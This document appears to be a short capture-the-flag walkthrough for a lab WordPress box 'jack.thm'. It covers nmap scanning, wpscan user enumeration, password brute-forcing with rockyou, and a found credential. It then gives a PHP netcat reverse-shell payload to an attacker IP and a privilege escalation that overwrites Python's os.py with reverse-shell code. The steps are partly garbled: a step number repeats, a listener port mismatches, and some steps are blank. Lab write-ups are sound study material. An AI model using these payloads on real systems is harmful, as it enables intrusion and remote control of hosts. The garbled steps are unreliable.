## Steps:
```
1. Connect with openvpn config file.
  $ openvpn configfile.ovpn
2. After connected in your server:
  $ nano /etc/hosts
3. Add "jack.thm"
4. Run with nmap:
  $ nmap -T4 -sS -sC -sV jack.thm scans/nmap
5. For find Users:
  $ wpscan -e u --url http://jack.thm
6. After got the users (danny,jack,wendy) and save it.
  $ wpscan --url http://jack.thm -U users.txt -P /usr/share/wordlists/rockyou.txt
    username: wendy & password: changelater
7. Login with credentials.
8. Add New 




8. Reverse shell from Netcat:
 <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f") ?>
 
9. Privleage:
 python -c 'import pty; pty.spawn("/bin/bash")'
 
10. 
chmod +x pspy64
./pspy64
go to /opt/statuscheck/ for check
$ cd usr/lib/python2.7
$ nano os.py
 ```
 import socket
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<my ip>", 4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```
$ python os.py
  nc -lvnp 444

```
